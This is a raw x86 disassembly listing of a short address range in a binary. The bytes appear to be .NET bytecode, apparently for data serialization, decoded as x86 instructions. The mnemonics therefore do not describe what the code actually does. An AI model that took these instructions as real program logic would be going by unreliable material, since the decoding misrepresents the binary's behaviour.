  4051b9:	09 17                	or     %edx,(%edi)
  4051bb:	58                   	pop    %eax
  4051bc:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051c1:	2a 06                	sub    (%esi),%al
  4051c3:	20 de                	and    %bl,%dh
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	00 40 55             	add    %al,0x55(%eax)
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	00 18                	add    %bl,(%eax)
  4051ce:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051d2:	01 0b                	add    %ecx,(%ebx)
  4051d4:	03 07                	add    (%edi),%eax
  4051d6:	16                   	push   %ss
  4051d7:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	0a 26                	or     (%esi),%ah
  4051de:	07                   	pop    %es
  4051df:	28 58 00             	sub    %bl,0x0(%eax)
  4051e2:	00 06                	add    %al,(%esi)
  4051e4:	0b 07                	or     (%edi),%eax
  4051e6:	16                   	push   %ss
  4051e7:	28 07                	sub    %al,(%edi)
  4051e9:	01 00                	add    %eax,(%eax)
  4051eb:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051ee:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051f1:	00 06                	add    %al,(%esi)
  4051f3:	02 18                	add    (%eax),%bl
  4051f5:	7d 36                	jge    0x40522d
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	04 16                	add    $0x16,%al
  4051fb:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405200:	00 02                	add    %al,(%edx)
  405202:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405206:	06                   	push   %es
  405207:	25 03 28 96 00       	and    $0x962803,%eax
  40520c:	00 06                	add    %al,(%esi)
  40520e:	6f                   	outsl  %ds:(%esi),(%dx)
  40520f:	6a 00                	push   $0x0
  405211:	00 06                	add    %al,(%esi)
  405213:	03 6f 88             	add    -0x78(%edi),%ebp
  405216:	00 00                	add    %al,(%eax)
  405218:	06                   	push   %es
  405219:	09 17                	or     %edx,(%edi)
  40521b:	58                   	pop    %eax
  40521c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405221:	2a 06                	sub    (%esi),%al
  405223:	20 df                	and    %bl,%bh
  405225:	00 00                	add    %al,(%eax)
  405227:	00 40 55             	add    %al,0x55(%eax)
  40522a:	00 00                	add    %al,(%eax)
  40522c:	00 1a                	add    %bl,(%edx)
  40522e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405232:	01 0b                	add    %ecx,(%ebx)
  405234:	03 07                	add    (%edi),%eax
  405236:	16                   	push   %ss
  405237:	1a 6f 45             	sbb    0x45(%edi),%ch
  40523a:	00 00                	add    %al,(%eax)
  40523c:	0a 26                	or     (%esi),%ah
  40523e:	07                   	pop    %es
  40523f:	28 58 00             	sub    %bl,0x0(%eax)
  405242:	00 06                	add    %al,(%esi)
  405244:	0b 07                	or     (%edi),%eax
  405246:	16                   	push   %ss
  405247:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40524b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40524e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405251:	00 06                	add    %al,(%esi)
  405253:	02 18                	add    (%eax),%bl
  405255:	7d 36                	jge    0x40528d
  405257:	00 00                	add    %al,(%eax)
  405259:	04 16                	add    $0x16,%al
  40525b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405260:	00 02                	add    %al,(%edx)
  405262:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405266:	06                   	push   %es
  405267:	25 03 28 96 00       	and    $0x962803,%eax
  40526c:	00 06                	add    %al,(%esi)
  40526e:	6f                   	outsl  %ds:(%esi),(%dx)
  40526f:	6a 00                	push   $0x0
  405271:	00 06                	add    %al,(%esi)
  405273:	03 6f 88             	add    -0x78(%edi),%ebp
  405276:	00 00                	add    %al,(%eax)
  405278:	06                   	push   %es
  405279:	09 17                	or     %edx,(%edi)
  40527b:	58                   	pop    %eax
  40527c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405281:	2a 06                	sub    (%esi),%al
  405283:	20 da                	and    %bl,%dl
  405285:	00 00                	add    %al,(%eax)
  405287:	00 40 0e             	add    %al,0xe(%eax)
  40528a:	00 00                	add    %al,(%eax)
  40528c:	00 02                	add    %al,(%edx)
  40528e:	06                   	push   %es
  40528f:	03 28                	add    (%eax),%ebp
  405291:	97                   	xchg   %eax,%edi
  405292:	00 00                	add    %al,(%eax)
  405294:	06                   	push   %es
  405295:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40529b:	06                   	push   %es
  40529c:	20 db                	and    %bl,%bl
  40529e:	00 00                	add    %al,(%eax)
  4052a0:	00 40 0e             	add    %al,0xe(%eax)
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	00 02                	add    %al,(%edx)
  4052a7:	06                   	push   %es
  4052a8:	03 28                	add    (%eax),%ebp
  4052aa:	97                   	xchg   %eax,%edi
  4052ab:	00 00                	add    %al,(%eax)
  4052ad:	06                   	push   %es
  4052ae:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052b4:	06                   	push   %es
  4052b5:	20 d0                	and    %dl,%al
  4052b7:	00 00                	add    %al,(%eax)
  4052b9:	00 40 0f             	add    %al,0xf(%eax)
  4052bc:	00 00                	add    %al,(%eax)
  4052be:	00 02                	add    %al,(%edx)
  4052c0:	03 6f 00             	add    0x0(%edi),%ebp
  4052c3:	01 00                	add    %eax,(%eax)
  4052c5:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c8:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052cc:	06                   	push   %es
  4052cd:	2a 06                	sub    (%esi),%al
  4052cf:	20 d1                	and    %dl,%cl
  4052d1:	00 00                	add    %al,(%eax)
  4052d3:	00 40 27             	add    %al,0x27(%eax)
  4052d6:	00 00                	add    %al,(%eax)
  4052d8:	00 18                	add    %bl,(%eax)
  4052da:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052de:	01 0b                	add    %ecx,(%ebx)
  4052e0:	03 07                	add    (%edi),%eax
  4052e2:	16                   	push   %ss
  4052e3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052e6:	00 00                	add    %al,(%eax)
  4052e8:	0a 26                	or     (%esi),%ah
  4052ea:	07                   	pop    %es
  4052eb:	28 58 00             	sub    %bl,0x0(%eax)
  4052ee:	00 06                	add    %al,(%esi)
  4052f0:	0b 02                	or     (%edx),%eax
  4052f2:	07                   	pop    %es
  4052f3:	16                   	push   %ss
  4052f4:	28 07                	sub    %al,(%edi)
  4052f6:	01 00                	add    %eax,(%eax)
  4052f8:	0a 6a 28             	or     0x28(%edx),%ch
  4052fb:	74 00                	je     0x4052fd
  4052fd:	00 06                	add    %al,(%esi)
  4052ff:	2a 06                	sub    (%esi),%al
  405301:	20 d2                	and    %dl,%dl
  405303:	00 00                	add    %al,(%eax)
  405305:	00 40 27             	add    %al,0x27(%eax)
  405308:	00 00                	add    %al,(%eax)
  40530a:	00 1a                	add    %bl,(%edx)
  40530c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405310:	01 0b                	add    %ecx,(%ebx)
  405312:	03 07                	add    (%edi),%eax
  405314:	16                   	push   %ss
  405315:	1a 6f 45             	sbb    0x45(%edi),%ch
  405318:	00 00                	add    %al,(%eax)
  40531a:	0a 26                	or     (%esi),%ah
  40531c:	07                   	pop    %es
  40531d:	28 58 00             	sub    %bl,0x0(%eax)
  405320:	00 06                	add    %al,(%esi)
  405322:	0b 02                	or     (%edx),%eax
  405324:	07                   	pop    %es
  405325:	16                   	push   %ss
  405326:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40532a:	0a 6a 28             	or     0x28(%edx),%ch
  40532d:	74 00                	je     0x40532f
  40532f:	00 06                	add    %al,(%esi)
  405331:	2a 06                	sub    (%esi),%al
  405333:	20 d3                	and    %dl,%bl
  405335:	00 00                	add    %al,(%eax)
  405337:	00 40 25             	add    %al,0x25(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	00 1e                	add    %bl,(%esi)
  40533e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405342:	01 0b                	add    %ecx,(%ebx)
  405344:	03 07                	add    (%edi),%eax
  405346:	16                   	push   %ss
  405347:	1e                   	push   %ds
  405348:	6f                   	outsl  %ds:(%esi),(%dx)
  405349:	45                   	inc    %ebp
  40534a:	00 00                	add    %al,(%eax)
  40534c:	0a 26                	or     (%esi),%ah
  40534e:	07                   	pop    %es
  40534f:	28 58 00             	sub    %bl,0x0(%eax)
  405352:	00 06                	add    %al,(%esi)
  405354:	0b 02                	or     (%edx),%eax
  405356:	07                   	pop    %es
  405357:	16                   	push   %ss
  405358:	28 08                	sub    %cl,(%eax)
  40535a:	01 00                	add    %eax,(%eax)
  40535c:	0a 28                	or     (%eax),%ch
  40535e:	74 00                	je     0x405360
  405360:	00 06                	add    %al,(%esi)
  405362:	2a 00                	sub    (%eax),%al
  405364:	1b 30                	sbb    (%eax),%esi
  405366:	04 00                	add    $0x0,%al
  405368:	4d                   	dec    %ebp
  405369:	00 00                	add    %al,(%eax)
  40536b:	00 27                	add    %ah,(%edi)
  40536d:	00 00                	add    %al,(%eax)
  40536f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405372:	00 00                	add    %al,(%eax)
  405374:	0a 0a                	or     (%edx),%cl
  405376:	02 06                	add    (%esi),%al
  405378:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  40537e:	6f                   	outsl  %ds:(%esi),(%dx)
  40537f:	e2 00                	loop   0x405381
  405381:	00 0a                	add    %cl,(%edx)
  405383:	d4 8d                	aam    $0x8d
  405385:	44                   	inc    %esp
  405386:	00 00                	add    %al,(%eax)
  405388:	01 0b                	add    %ecx,(%ebx)
  40538a:	06                   	push   %es
  40538b:	16                   	push   %ss
  40538c:	6a 6f                	push   $0x6f
  40538e:	4e                   	dec    %esi
  40538f:	00 00                	add    %al,(%eax)
  405391:	0a 06                	or     (%esi),%al
  405393:	07                   	pop    %es
  405394:	16                   	push   %ss
  405395:	06                   	push   %es
  405396:	6f                   	outsl  %ds:(%esi),(%dx)
  405397:	e2 00                	loop   0x405399
  405399:	00 0a                	add    %cl,(%edx)
  40539b:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4053a2:	07                   	pop    %es
  4053a3:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a9:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053af:	39 06                	cmp    %eax,(%esi)
  4053b1:	00 00                	add    %al,(%eax)
  4053b3:	00 06                	add    %al,(%esi)
  4053b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b6:	33 00                	xor    (%eax),%eax
  4053b8:	00 0a                	add    %cl,(%edx)
  4053ba:	dc 08                	fmull  (%eax)
  4053bc:	2a 00                	sub    (%eax),%al
  4053be:	00 00                	add    %al,(%eax)
  4053c0:	01 10                	add    %edx,(%eax)
  4053c2:	00 00                	add    %al,(%eax)
  4053c4:	02 00                	add    (%eax),%al
  4053c6:	06                   	push   %es
  4053c7:	00 38                	add    %bh,(%eax)
  4053c9:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053d0:	13 30                	adc    (%eax),%esi
  4053d2:	02 00                	add    (%eax),%al
  4053d4:	ec                   	in     (%dx),%al
  4053d5:	00 00                	add    %al,(%eax)
  4053d7:	00 20                	add    %ah,(%eax)
  4053d9:	00 00                	add    %al,(%eax)
  4053db:	11 02                	adc    %eax,(%edx)
  4053dd:	7b 36                	jnp    0x405415
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	04 0a                	add    $0xa,%al
  4053e3:	06                   	push   %es
  4053e4:	45                   	inc    %ebp
  4053e5:	0c 00                	or     $0x0,%al
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	05 00 00 00 05       	add    $0x5000000,%eax
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	1e                   	push   %ds
  4053fe:	00 00                	add    %al,(%eax)
  405400:	00 30                	add    %dh,(%eax)
  405402:	00 00                	add    %al,(%eax)
  405404:	00 42 00             	add    %al,0x0(%edx)
  405407:	00 00                	add    %al,(%eax)
  405409:	54                   	push   %esp
  40540a:	00 00                	add    %al,(%eax)
  40540c:	00 66 00             	add    %ah,0x0(%esi)
  40540f:	00 00                	add    %al,(%eax)
  405411:	79 00                	jns    0x405413
  405413:	00 00                	add    %al,(%eax)
  405415:	86 00                	xchg   %al,(%eax)
  405417:	00 00                	add    %al,(%eax)
  405419:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  40541f:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  405425:	03 02                	add    (%edx),%eax
  405427:	7b 35                	jnp    0x40545e
  405429:	00 00                	add    %al,(%eax)
  40542b:	04 74                	add    $0x74,%al
  40542d:	38 00                	cmp    %al,(%eax)
  40542f:	00 01                	add    %al,(%ecx)
  405431:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  405437:	03 02                	add    (%edx),%eax
  405439:	7b 35                	jnp    0x405470
  40543b:	00 00                	add    %al,(%eax)
  40543d:	04 a5                	add    $0xa5,%al
  40543f:	68 00 00 01 28       	push   $0x28010000
  405444:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405449:	03 02                	add    (%edx),%eax
  40544b:	7b 35                	jnp    0x405482
  40544d:	00 00                	add    %al,(%eax)
  40544f:	04 a5                	add    $0xa5,%al
  405451:	95                   	xchg   %eax,%ebp
  405452:	00 00                	add    %al,(%eax)
  405454:	01 28                	add    %ebp,(%eax)
  405456:	9f                   	lahf
  405457:	00 00                	add    %al,(%eax)
  405459:	06                   	push   %es
  40545a:	2a 03                	sub    (%ebx),%al
  40545c:	02 7b 35             	add    0x35(%ebx),%bh
  40545f:	00 00                	add    %al,(%eax)
  405461:	04 a5                	add    $0xa5,%al
  405463:	6c                   	insb   (%dx),%es:(%edi)
  405464:	00 00                	add    %al,(%eax)
  405466:	01 28                	add    %ebp,(%eax)
  405468:	9e                   	sahf
  405469:	00 00                	add    %al,(%eax)
  40546b:	06                   	push   %es
  40546c:	2a 03                	sub    (%ebx),%al
  40546e:	02 7b 35             	add    0x35(%ebx),%bh
  405471:	00 00                	add    %al,(%eax)
  405473:	04 a5                	add    $0xa5,%al
  405475:	96                   	xchg   %eax,%esi
  405476:	00 00                	add    %al,(%eax)
  405478:	01 28                	add    %ebp,(%eax)
  40547a:	9c                   	pushf
  40547b:	00 00                	add    %al,(%eax)
  40547d:	06                   	push   %es
  40547e:	2a 03                	sub    (%ebx),%al
  405480:	02 7b 35             	add    0x35(%ebx),%bh
  405483:	00 00                	add    %al,(%eax)
  405485:	04 a5                	add    $0xa5,%al
  405487:	97                   	xchg   %eax,%edi
  405488:	00 00                	add    %al,(%eax)
  40548a:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  40548e:	00 00                	add    %al,(%eax)
  405490:	06                   	push   %es
  405491:	2a 03                	sub    (%ebx),%al
  405493:	02 28                	add    (%eax),%ch
  405495:	77 00                	ja     0x405497
  405497:	00 06                	add    %al,(%esi)
  405499:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  40549f:	03 02                	add    (%edx),%eax
  4054a1:	7b 35                	jnp    0x4054d8
  4054a3:	00 00                	add    %al,(%eax)
  4054a5:	04 74                	add    $0x74,%al
  4054a7:	02 00                	add    (%eax),%al
  4054a9:	00 1b                	add    %bl,(%ebx)
  4054ab:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054b1:	02 03                	add    (%ebx),%al
  4054b3:	28 72 00             	sub    %dh,0x0(%edx)
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 02                	sub    (%edx),%al
  4054ba:	03 28                	add    (%eax),%ebp
  4054bc:	73 00                	jae    0x4054be
  4054be:	00 06                	add    %al,(%esi)
  4054c0:	2a 03                	sub    (%ebx),%al
  4054c2:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c8:	1b 30                	sbb    (%eax),%esi
  4054ca:	03 00                	add    (%eax),%eax
  4054cc:	42                   	inc    %edx
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	00 28                	add    %ch,(%eax)
  4054d1:	00 00                	add    %al,(%eax)
  4054d3:	11 02                	adc    %eax,(%edx)
  4054d5:	0a 16                	or     (%esi),%dl
  4054d7:	0b 06                	or     (%esi),%eax
  4054d9:	12 01                	adc    (%ecx),%al
  4054db:	28 49 00             	sub    %cl,0x0(%ecx)
  4054de:	00 0a                	add    %cl,(%edx)
  4054e0:	02 7b 39             	add    0x39(%ebx),%bh
  4054e3:	00 00                	add    %al,(%eax)
  4054e5:	04 3a                	add    $0x3a,%al
  4054e7:	12 00                	adc    (%eax),%al
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	02 02                	add    (%edx),%al
  4054ed:	02 7b 38             	add    0x38(%ebx),%bh
  4054f0:	00 00                	add    %al,(%eax)
  4054f2:	04 73                	add    $0x73,%al
  4054f4:	63 00                	arpl   %eax,(%eax)
  4054f6:	00 06                	add    %al,(%esi)
  4054f8:	7d 39                	jge    0x405533
  4054fa:	00 00                	add    %al,(%eax)
  4054fc:	04 dd                	add    $0xdd,%al
  4054fe:	0d 00 00 00 07       	or     $0x7000000,%eax
  405503:	39 06                	cmp    %eax,(%esi)
  405505:	00 00                	add    %al,(%eax)
  405507:	00 06                	add    %al,(%esi)
  405509:	28 50 00             	sub    %dl,0x0(%eax)
  40550c:	00 0a                	add    %cl,(%edx)
  40550e:	dc 02                	faddl  (%edx)
  405510:	7b 39                	jnp    0x40554b
  405512:	00 00                	add    %al,(%eax)
  405514:	04 2a                	add    $0x2a,%al
  405516:	00 00                	add    %al,(%eax)
  405518:	01 10                	add    %edx,(%eax)
  40551a:	00 00                	add    %al,(%eax)
  40551c:	02 00                	add    (%eax),%al
  40551e:	04 00                	add    $0x0,%al
  405520:	2a 2e                	sub    (%esi),%ch
  405522:	00 0d 00 00 00 00    	add    %cl,0x0
  405528:	13 30                	adc    (%eax),%esi
  40552a:	04 00                	add    $0x0,%al
  40552c:	18 00                	sbb    %al,(%eax)
  40552e:	00 00                	add    %al,(%eax)
  405530:	29 00                	sub    %eax,(%eax)
  405532:	00 11                	add    %dl,(%ecx)
  405534:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  40553a:	0a 02                	or     (%edx),%al
  40553c:	06                   	push   %es
  40553d:	16                   	push   %ss
  40553e:	03 6f 45             	add    0x45(%edi),%ebp
  405541:	00 00                	add    %al,(%eax)
  405543:	0a 26                	or     (%esi),%ah
  405545:	06                   	push   %es
  405546:	28 55 00             	sub    %dl,0x0(%ebp)
  405549:	00 06                	add    %al,(%esi)
  40554b:	2a 13                	sub    (%ebx),%dl
  40554d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405550:	b1 00                	mov    $0x0,%cl
  405552:	00 00                	add    %al,(%eax)
  405554:	2a 00                	sub    (%eax),%al
  405556:	00 11                	add    %dl,(%ecx)
  405558:	14 0a                	adc    $0xa,%al
  40555a:	16                   	push   %ss
  40555b:	0b 02                	or     (%edx),%eax
  40555d:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  405563:	18 00                	sbb    %al,(%eax)
  405565:	00 00                	add    %al,(%eax)
  405567:	02 20                	add    (%eax),%ah
  405569:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  40556e:	0d 00 00 00 02       	or     $0x2000000,%eax
  405573:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405579:	0b 38                	or     (%eax),%edi
  40557b:	72 00                	jb     0x40557d
  40557d:	00 00                	add    %al,(%eax)
  40557f:	02 20                	add    (%eax),%ah
  405581:	d9 00                	flds   (%eax)
  405583:	00 00                	add    %al,(%eax)
  405585:	40                   	inc    %eax
  405586:	0c 00                	or     $0x0,%al
  405588:	00 00                	add    %al,(%eax)
  40558a:	03 6f 00             	add    0x0(%edi),%ebp
  40558d:	01 00                	add    %eax,(%eax)
  40558f:	0a 0b                	or     (%ebx),%cl
  405591:	38 5b 00             	cmp    %bl,0x0(%ebx)
  405594:	00 00                	add    %al,(%eax)
  405596:	02 20                	add    (%eax),%ah
  405598:	da 00                	fiaddl (%eax)
  40559a:	00 00                	add    %al,(%eax)
  40559c:	40                   	inc    %eax
  40559d:	25 00 00 00 18       	and    $0x18000000,%eax
  4055a2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055a6:	01 0a                	add    %ecx,(%edx)
  4055a8:	03 06                	add    (%esi),%eax
  4055aa:	16                   	push   %ss
  4055ab:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055ae:	00 00                	add    %al,(%eax)
  4055b0:	0a 26                	or     (%esi),%ah
  4055b2:	06                   	push   %es
  4055b3:	28 58 00             	sub    %bl,0x0(%eax)
  4055b6:	00 06                	add    %al,(%esi)
  4055b8:	0a 06                	or     (%esi),%al
  4055ba:	16                   	push   %ss
  4055bb:	28 02                	sub    %al,(%edx)
  4055bd:	01 00                	add    %eax,(%eax)
  4055bf:	0a 0b                	or     (%ebx),%cl
  4055c1:	38 2b                	cmp    %ch,(%ebx)
  4055c3:	00 00                	add    %al,(%eax)
  4055c5:	00 02                	add    %al,(%edx)
  4055c7:	20 db                	and    %bl,%bl
  4055c9:	00 00                	add    %al,(%eax)
  4055cb:	00 40 20             	add    %al,0x20(%eax)
  4055ce:	00 00                	add    %al,(%eax)
  4055d0:	00 1a                	add    %bl,(%edx)
  4055d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055d6:	01 0a                	add    %ecx,(%edx)
  4055d8:	03 06                	add    (%esi),%eax
  4055da:	16                   	push   %ss
  4055db:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	0a 26                	or     (%esi),%ah
  4055e2:	06                   	push   %es
  4055e3:	28 58 00             	sub    %bl,0x0(%eax)
  4055e6:	00 06                	add    %al,(%esi)
  4055e8:	0a 06                	or     (%esi),%al
  4055ea:	16                   	push   %ss
  4055eb:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055ef:	0a 0b                	or     (%ebx),%cl
  4055f1:	07                   	pop    %es
  4055f2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055f6:	01 0a                	add    %ecx,(%edx)
  4055f8:	03 06                	add    (%esi),%eax
  4055fa:	16                   	push   %ss
  4055fb:	07                   	pop    %es
  4055fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4055fd:	45                   	inc    %ebp
  4055fe:	00 00                	add    %al,(%eax)
  405600:	0a 26                	or     (%esi),%ah
  405602:	06                   	push   %es
  405603:	28 55 00             	sub    %dl,0x0(%ebp)
  405606:	00 06                	add    %al,(%esi)
  405608:	2a 00                	sub    (%eax),%al
  40560a:	00 00                	add    %al,(%eax)
  40560c:	13 30                	adc    (%eax),%esi
  40560e:	04 00                	add    $0x0,%al
  405610:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  405615:	00 00                	add    %al,(%eax)
  405617:	11 03                	adc    %eax,(%ebx)
  405619:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  40561d:	06                   	push   %es
  40561e:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405621:	06                   	push   %es
  405622:	8e 69 0c             	mov    0xc(%ecx),%gs
  405625:	16                   	push   %ss
  405626:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  40562b:	16                   	push   %ss
  40562c:	00 00                	add    %al,(%eax)
  40562e:	00 20                	add    %ah,(%eax)
  405630:	a0 00 00 00 08       	mov    0x8000000,%al
  405635:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405638:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  40563d:	00 00                	add    %al,(%eax)
  40563f:	0a 38                	or     (%eax),%bh
  405641:	80 00 00             	addb   $0x0,(%eax)
  405644:	00 08                	add    %cl,(%eax)
  405646:	20 ff                	and    %bh,%bh
  405648:	00 00                	add    %al,(%eax)
  40564a:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405650:	20 d9                	and    %bl,%cl
  405652:	00 00                	add    %al,(%eax)
  405654:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  40565a:	00 00                	add    %al,(%eax)
  40565c:	0a 08                	or     (%eax),%cl
  40565e:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  405664:	00 00                	add    %al,(%eax)
  405666:	0a 38                	or     (%eax),%bh
  405668:	59                   	pop    %ecx
  405669:	00 00                	add    %al,(%eax)
  40566b:	00 08                	add    %cl,(%eax)
  40566d:	20 ff                	and    %bh,%bh
  40566f:	ff 00                	incl   (%eax)
  405671:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405677:	20 da                	and    %bl,%dl
  405679:	00 00                	add    %al,(%eax)
  40567b:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405681:	00 00                	add    %al,(%eax)
  405683:	0a 08                	or     (%eax),%cl
  405685:	68 28 ef 00 00       	push   $0xef28
  40568a:	0a 28                	or     (%eax),%ch
  40568c:	58                   	pop    %eax
  40568d:	00 00                	add    %al,(%eax)
  40568f:	06                   	push   %es
  405690:	0b 02                	or     (%edx),%eax
  405692:	07                   	pop    %es
  405693:	16                   	push   %ss
  405694:	07                   	pop    %es
  405695:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405698:	4c                   	dec    %esp
  405699:	00 00                	add    %al,(%eax)
  40569b:	0a 38                	or     (%eax),%bh
  40569d:	24 00                	and    $0x0,%al
  40569f:	00 00                	add    %al,(%eax)
  4056a1:	20 db                	and    %bl,%bl
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056ab:	00 00                	add    %al,(%eax)
  4056ad:	0a 08                	or     (%eax),%cl
  4056af:	28 4a 00             	sub    %cl,0x0(%edx)
  4056b2:	00 0a                	add    %cl,(%edx)
  4056b4:	28 58 00             	sub    %bl,0x0(%eax)
  4056b7:	00 06                	add    %al,(%esi)
  4056b9:	0b 02                	or     (%edx),%eax
  4056bb:	07                   	pop    %es
  4056bc:	16                   	push   %ss
  4056bd:	07                   	pop    %es
  4056be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c1:	4c                   	dec    %esp
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	0a 02                	or     (%edx),%al
  4056c6:	06                   	push   %es
  4056c7:	16                   	push   %ss
  4056c8:	06                   	push   %es
  4056c9:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056cc:	4c                   	dec    %esp
  4056cd:	00 00                	add    %al,(%eax)
  4056cf:	0a 2a                	or     (%edx),%ch
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 13                	add    %dl,(%ebx)
  4056d5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d8:	94                   	xchg   %eax,%esp
  4056d9:	00 00                	add    %al,(%eax)
  4056db:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056de:	00 11                	add    %dl,(%ecx)
  4056e0:	14 0a                	adc    $0xa,%al
  4056e2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e8:	07                   	pop    %es
  4056e9:	20 ff                	and    %bh,%bh
  4056eb:	00 00                	add    %al,(%eax)
  4056ed:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056f3:	20 c4                	and    %al,%ah
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056fa:	08 6f ee             	or     %ch,-0x12(%edi)
  4056fd:	00 00                	add    %al,(%eax)
  4056ff:	0a 07                	or     (%edi),%al
  405701:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  405704:	08 6f ee             	or     %ch,-0x12(%edi)
  405707:	00 00                	add    %al,(%eax)
  405709:	0a 38                	or     (%eax),%bh
  40570b:	59                   	pop    %ecx
  40570c:	00 00                	add    %al,(%eax)
  40570e:	00 07                	add    %al,(%edi)
  405710:	20 ff                	and    %bh,%bh
  405712:	ff 00                	incl   (%eax)
  405714:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40571a:	20 c5                	and    %al,%ch
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405721:	08 6f ee             	or     %ch,-0x12(%edi)
  405724:	00 00                	add    %al,(%eax)
  405726:	0a 07                	or     (%edi),%al
  405728:	68 28 ef 00 00       	push   $0xef28
  40572d:	0a 28                	or     (%eax),%ch
  40572f:	58                   	pop    %eax
  405730:	00 00                	add    %al,(%eax)
  405732:	06                   	push   %es
  405733:	0a 02                	or     (%edx),%al
  405735:	06                   	push   %es
  405736:	16                   	push   %ss
  405737:	06                   	push   %es
  405738:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40573b:	4c                   	dec    %esp
  40573c:	00 00                	add    %al,(%eax)
  40573e:	0a 38                	or     (%eax),%bh
  405740:	24 00                	and    $0x0,%al
  405742:	00 00                	add    %al,(%eax)
  405744:	20 c6                	and    %al,%dh
  405746:	00 00                	add    %al,(%eax)
  405748:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40574b:	08 6f ee             	or     %ch,-0x12(%edi)
